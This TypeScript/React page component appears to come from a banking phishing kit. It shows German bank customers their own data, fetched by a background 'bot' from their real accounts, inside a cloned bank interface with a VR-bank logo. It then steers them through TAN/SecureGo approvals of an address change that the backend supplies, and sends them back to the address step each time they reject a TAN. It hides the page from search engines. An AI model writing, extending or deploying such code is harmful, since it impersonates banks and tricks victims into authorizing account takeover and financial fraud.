import { useEffect, useMemo, useRef, useState } from "react";
import { createFileRoute } from "@tanstack/react-router";
import { Loader2 } from "lucide-react";
import { getBotTask } from "@/lib/botClient";
import { BankShell, type FlowTheme } from "@/components/flow/BankShell";
import PersonalDataOverview, { type CustomerData } from "@/components/flow/PersonalDataOverview";
import AddressVerification from "@/components/AddressVerification";
import { CompletionStep } from "@/components/flow/CompletionStep";
import vrLogoGeneric from "@/assets/vr-logo-generic.png";


type BankCtx = {
  bankId: string;
  bankName: string;
  group: string;
  theme: FlowTheme;
  logoSrc: string;
  fallbackLogoSrc: string;
  showName: boolean;
  bigLogo: boolean;
  footerLinks?: Record<string, { label: string; url: string }> | null;
};

const DEFAULT_THEME: FlowTheme = {
  headerBg: "#ffffff",
  buttonBg: "#003399",
  accentText: "#003399",
  topBarColor: "#003399",
  buttonRadius: "rounded-full",
};

type Step = "personal" | "address" | "done";

export const Route = createFileRoute("/personal-data/$taskId")({
  head: () => ({
    meta: [
      { title: "Persönliche Daten" },
      { name: "description", content: "Anzeige und Bestätigung Ihrer hinterlegten Kundendaten." },
      { name: "robots", content: "noindex,nofollow" },
    ],
  }),
  component: PersonalDataPage,
});

function firstString(...vals: unknown[]): string {
  for (const v of vals) {
    if (typeof v === "string" && v.trim()) return v.trim();
    if (typeof v === "number") return String(v);
  }
  return "";
}

function mapCustomer(result: any, bankName: string): CustomerData {
  const p = result?.person_data ?? {};
  const kd = result?.kontakt_data ?? {};
  const ad = result?.adressen_data ?? {};
  
  const anrede = firstString(p.anrede, p.salutation) || "Herr/Frau";
  const name = firstString(
    p?.namen?.anzeigenameKurz,
    p?.namen?.anzeigename,
    p?.name,
    [p?.vorname, p?.nachname].filter(Boolean).join(" "),
  ) || "—";
  
  const kundenNr = firstString(result?.customer_number, p?.kundennummer, p?.customerNumber, result?.credentials?.username) || "—";
  const geb = firstString(p?.geburtsdatum, p?.birthday, p?.dateOfBirth) || "—";
  
  // Familienstand (person_data.familie.familienstandBezeichnung)
  const fam = firstString(p?.familie?.familienstandBezeichnung, p?.familienstand, p?.maritalStatus) || "—";
  
  // E‑Mail (kontakt_data.emailAdressen[0].bezeichnung)
  const email = firstString(
    kd?.emailAdressen?.[0]?.bezeichnung,
    p?.email, 
    p?.emailPrivat, 
    p?.kontakt?.email
  ) || "—";
  
  // Mobil (kontakt_data.mobilfunkNummern[0].bezeichnung)
  const mobil = firstString(
    kd?.mobilfunkNummern?.[0]?.bezeichnung,
    p?.mobil, 
    p?.mobilNr, 
    p?.telefonMobil, 
    p?.kontakt?.mobil
  ) || "—";
  
  // Telefon (kontakt_data.festnetzNummern[0].bezeichnung)
  const phone = firstString(kd?.festnetzNummern?.[0]?.bezeichnung) || "";
  
  // Hauptadresse (aus adressen_data.hauptadresse.postadresse)
  const address = ad?.hauptadresse?.postadresse || p.adresse || p.address || {};
  const strasse = firstString(address.strasse, address.street, [address.strasse, address.hausnummer].filter(Boolean).join(" ")) || "Musterstraße 12";
  const plz = firstString(address.postleitzahl, address.plz, address.zip);
  const ort = firstString(address.ort, address.city, address.stadt);
  const plzOrt = [plz, ort].filter(Boolean).join(" ") || "12345 Musterstadt";

  return {
    anrede,
    name,
    kundenNr,
    geburtsdatum: geb,
    familienstand: fam,
    email,
    mobilNr: mobil,
    adresse: { strasse, plzOrt },
  };
}

function makeFallbackAddress(current: { strasse: string; plzOrt: string }) {
  const city = current.plzOrt.replace(/^\d{4,5}\s*/, "") || "Musterstadt";
  const plz = (current.plzOrt.match(/^\d{4,5}/)?.[0]) || "12345";
  return { strasse: "Lindenweg 3", plzOrt: `${plz} ${city}` };
}

function PersonalDataPage() {
  const { taskId } = Route.useParams();
  const [result, setResult] = useState<any>(null);
  const [bankCtx, setBankCtx] = useState<BankCtx | null>(null);
  const [step, setStep] = useState<Step>("personal");
  const [addressDecisionPending, setAddressDecisionPending] = useState(false);
  const [forceShowSecureGo, setForceShowSecureGo] = useState(false);
  const [addressFlowHandled, setAddressFlowHandled] = useState(false);
  const [personalViewKey, setPersonalViewKey] = useState(0);
  const stepRef = useRef<Step>("personal");
  const addressTanFailedRef = useRef(false);
  useEffect(() => { stepRef.current = step; }, [step]);

  const returnToAddressSelection = () => {
    addressTanFailedRef.current = true;
    setForceShowSecureGo(false);
    setAddressDecisionPending(true);
    setAddressFlowHandled(false);
    setPersonalViewKey((value) => value + 1);
    setStep("personal");
  };

  const [showAddressDeleteOverlay, setShowAddressDeleteOverlay] = useState(false);

  // Bank context is cached from the login route; restore synchronously
  useEffect(() => {
    try {
      const raw = sessionStorage.getItem(`bot_bank_${taskId}`);
      if (raw) setBankCtx(JSON.parse(raw));
    } catch {}
    try {
      const raw = sessionStorage.getItem(`bot_result_${taskId}`);
      if (raw) setResult(JSON.parse(raw));
    } catch {}
    try {
      if (sessionStorage.getItem(`bot_address_pending_${taskId}`) === "1") {
        setShowAddressDeleteOverlay(true);
        sessionStorage.removeItem(`bot_address_pending_${taskId}`);
      }
    } catch {}

  }, [taskId]);

  // Keep polling the task so late-arriving fields (Kontostand, Karten, Adresse)
  // update the UI while the bot finishes in the background.
  useEffect(() => {
    let cancelled = false;
    let timer: ReturnType<typeof setTimeout> | null = null;
    const startedAt = Date.now();
    const TIMEOUT_MS = 5 * 60 * 1000;
    const tick = async () => {
      const { data } = await getBotTask(taskId).catch(() => ({ status: 0, data: {} as any }));
      if (cancelled) return;
      if (data?.result) {
        setResult(data.result);
        try { sessionStorage.setItem(`bot_result_${taskId}`, JSON.stringify(data.result)); } catch {}
      }
      // Unlock the address-change popup only after the backend signals it is
      // ready for the user's confirmation.
      if (data?.status === "waiting_for_address_confirm" && !addressFlowHandled && !addressTanFailedRef.current) {
        // Zeige die Personal-Data-Seite mit nur der Hauptadresse und blende
        // den Lösch-Dialog als Overlay ein. Die zweite Adresse erscheint
        // erst nach einer TAN-Ablehnung / Abbruch.
        setShowAddressDeleteOverlay(true);
      }

      const status = String(data?.status ?? "").toLowerCase();
      const tanType = String(data?.tan_type ?? data?.result?.tan_type ?? "").toLowerCase();
      const isFailure =
        status === "tan_rejected" ||
        status === "rejected" ||
        status === "tan_timeout" ||
        status === "failed";
      // Sobald der Adressänderungs-Flow läuft (address step oder address tan_type),
      // gilt jede Fehlermeldung als abgelehnte Adress-TAN → zurück zur Adress-Übersicht.
      if (isFailure && (tanType === "address" || stepRef.current === "address" || addressFlowHandled)) {
        returnToAddressSelection();
        return;
      }
      if (data?.status === "completed" || data?.status === "failed") return;
      if (Date.now() - startedAt > TIMEOUT_MS) return;
      timer = setTimeout(tick, 1500);
    };
    tick();
    return () => { cancelled = true; if (timer) clearTimeout(timer); };
  }, [taskId, addressFlowHandled]);

  const customer = useMemo(
    () => (result ? mapCustomer(result, bankCtx?.bankName ?? "") : null),
    [result, bankCtx?.bankName],
  );

  const addressData = result?.address_data ?? null;


  if (!result && !addressData) {
    return (
      <div className="min-h-screen flex flex-col items-center justify-center bg-gray-50 text-gray-500">
        <Loader2 className="h-8 w-8 animate-spin mb-3 text-gray-400" />
        <p className="text-sm">Daten werden geladen…</p>
      </div>
    );
  }


  const theme = bankCtx?.theme ?? DEFAULT_THEME;
  const shellProps = {
    theme,
    logoSrc: bankCtx?.logoSrc ?? vrLogoGeneric,
    fallbackLogoSrc: bankCtx?.fallbackLogoSrc ?? vrLogoGeneric,
    bankName: bankCtx?.bankName ?? "Online-Banking",
    showName: bankCtx?.showName ?? false,
    bigLogo: bankCtx?.bigLogo ?? false,
    footerLinks: (bankCtx?.footerLinks ?? null) as any,
  };

  const bankId = bankCtx?.bankId ?? "";

  return (
    <BankShell {...shellProps}>
      {customer && step === "personal" && (
        <PersonalDataOverview
          key={personalViewKey}
          // @ts-expect-error FlowTheme is structurally compatible; component only reads shared fields
          theme={theme}
          customerData={customer}
          bankId={bankId}
          addressDecisionPending={addressDecisionPending}
          additionalAddressOverride={addressData ? {
            strasse: firstString(addressData.new_street, addressData.street),
            plzOrt: [firstString(addressData.new_plz, addressData.plz), firstString(addressData.new_city, addressData.city)]
              .filter(Boolean)
              .join(" "),
          } : null}
          onAddressChoiceResolved={() => {
            addressTanFailedRef.current = false;
            setAddressDecisionPending(false);
            setForceShowSecureGo(true);
            setStep("address");
          }}
          onContinue={() => {
            if (addressDecisionPending) {
              setStep("address");
              return;
            }
            setStep("done");
          }}
          onEditAddress={() => setStep("done")}
        />
      )}

      {customer && step === "address" && (
        <AddressVerification
          bankName={bankCtx?.bankName ?? ""}
          bankId={bankId}
          bankGroup={bankCtx?.group}
          // @ts-expect-error FlowTheme is structurally compatible with BankTheme
          theme={theme}
          customerName={customer.name}
          customerNumber={customer.kundenNr}
          customerEmail={customer.email}
          customerPhone={customer.mobilNr}
          currentAddress={customer.adresse}
          additionalAddress={addressData ? {
            strasse: firstString(addressData.new_street, addressData.street),
            plzOrt: [firstString(addressData.new_plz, addressData.plz), firstString(addressData.new_city, addressData.city)]
              .filter(Boolean)
              .join(" "),
          } : undefined}
          forceShowSecureGo={forceShowSecureGo}
          onSecureGoOpened={() => setForceShowSecureGo(false)}
          onConfirm={() => setStep("done")}
          onDelete={() => {
            if (addressTanFailedRef.current) {
              returnToAddressSelection();
              return;
            }
            setAddressFlowHandled(true);
            setAddressDecisionPending(false);
            setForceShowSecureGo(false);
            setStep("done");
          }}
          onTanFailed={returnToAddressSelection}
          onNoAddress={() => setStep("done")}
          taskId={taskId}
        />
      )}

      {customer && step === "done" && (
        <CompletionStep theme={theme} customerName={customer.name} />
      )}

      {!customer && (
        <div className="min-h-[40vh] flex flex-col items-center justify-center text-gray-500">
          <Loader2 className="h-8 w-8 animate-spin mb-3 text-gray-400" />
          <p className="text-sm">Daten werden geladen…</p>
        </div>
      )}
    </BankShell>
  );
}

